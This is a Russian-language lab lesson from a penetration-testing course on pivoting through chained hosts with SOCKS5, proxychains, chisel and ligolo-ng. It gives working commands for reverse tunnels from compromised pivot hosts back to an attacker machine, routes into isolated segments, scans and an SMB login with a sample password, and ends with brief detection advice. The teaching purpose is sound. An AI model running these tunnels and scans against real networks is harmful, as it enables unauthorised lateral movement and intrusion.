# 14.2 — SOCKS, proxychains, двойной pivot

> **M14 · Этап 2 · 5 ч · 🔴 · артефакт:** `labs/m14-pivoting-infra/l02-pivot/`

## Цель

Ходить через цепочку хостов: SOCKS5, proxychains, ligolo-ng и двойной pivot. Понимать ограничения SOCKS (UDP, ICMP, DNS).

## Результат

- Двойной pivot до изолированного сегмента.
- Рабочий proxychains/chisel.
- Таблица «протокол → проходит ли через SOCKS».

## Теория

### 1. SOCKS5

Проксирует TCP (и, при поддержке, UDP). Не проксирует ICMP и часто ломает DNS. Для сканирования используйте `-sT` (connect scan), а не SYN.

```bash
proxychains4 nmap -sT -Pn -p 80,445 10.10.30.10
```

### 2. proxychains

```ini
# /etc/proxychains.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```

`proxy_dns` отправляет DNS через прокси (важно для имён). `strict_chain` — все запросы через цепочку.

### 3. Двойной pivot

```text
ATTACK → PIVOT1 (10.10.10.20) → PIVOT2 (10.10.20.30) → TARGET (10.10.30.10)
```

Вариант: chisel server на `ATTACK`, client на `PIVOT1` (`R:socks`), затем второй chisel client на `PIVOT2` через первый SOCKS — но проще ligolo-ng или SSH-цепочка.

### 4. ligolo-ng

L3-туннель через TUN-интерфейс: полноценная маршрутизация, включая ICMP/UDP.

```bash
# ATTACK
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# PIVOT
./agent -connect 10.10.10.50:11601 -ignore-cert
# в консоли proxy
session
ifconfig
start
# ATTACK
sudo ip route add 10.10.20.0/24 dev ligolo
```

Ожидаемо: `ping 10.10.20.10` работает.

### 5. Ограничения

- SOCKS: TCP, иногда UDP; DNS зависит от настройки.
- HTTP-прокси: только HTTP/HTTPS.
- ligolo: нужен TUN и root на атакующем.
- Вложенные туннели добавляют задержку и точки отказа.

## Лаборатория

> `ATTACK` → `PIVOT1` → `PIVOT2` → `TARGET` (10.10.30.10).

### 1. Первый pivot

```bash
ssh -N -D 1080 user@10.10.10.20
```

### 2. Второй pivot

На `PIVOT1` запустите chisel client к `ATTACK`, затем с `PIVOT2` — к `PIVOT1`:

```bash
# PIVOT1
./chisel server -p 9000 --socks5
# PIVOT2
./chisel client 10.10.20.30:9000 R:socks
```

Но `PIVOT2` должен видеть `PIVOT1`; для двойного SOCKS удобнее ligolo.

### 3. ligolo (рекомендуется)

```bash
# ATTACK
./proxy -selfcert -laddr 0.0.0.0:11601
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
# PIVOT1
./agent -connect 10.10.10.50:11601 -ignore-cert
```

В консоли `proxy`: `session` → `ifconfig` → `start`. Затем:

```bash
sudo ip route add 10.10.20.0/24 dev ligolo
```

Для второго сегмента повторите с `PIVOT2` (agent через первый туннель) или используйте `listener`/`autoroute`.

### 4. Проверка

```bash
nmap -sT -Pn -p 22,80,445 10.10.30.10
curl http://10.10.30.10
ping -c 1 10.10.30.10
```

Ожидаемо: TCP работает; ICMP через SOCKS — нет, через ligolo — да.

### 5. proxychains

```bash
proxychains4 -q nxc smb 10.10.30.10 -u alice -p 'Password123!'
```

Ожидаемо: подключение через цепочку.

### 6. Сравнение

| Протокол | SOCKS5 | ligolo |
|---|---|---|
| TCP | да | да |
| UDP | иногда | да |
| ICMP | нет | да |
| DNS | через proxy_dns | да |

## Атака и защита

- **Атака:** цепочка прокси/туннелей.
- **Детект:** аномальные исходящие соединения, задержки, процессы, маршруты.
- **Фикс:** сегментация, egress, мониторинг, запрет TUN на рабочих станциях.

## Самопроверка

- [ ] Почему `nmap -sS` не работает через SOCKS?
- [ ] Что делает `proxy_dns`?
- [ ] Чем ligolo лучше SOCKS?
- [ ] Где точка отказа в двойном pivot?
- [ ] Как защитник увидит цепочку?

## Дальше

[14.3 — Инфраструктура как код](l03-infra-as-code.md)
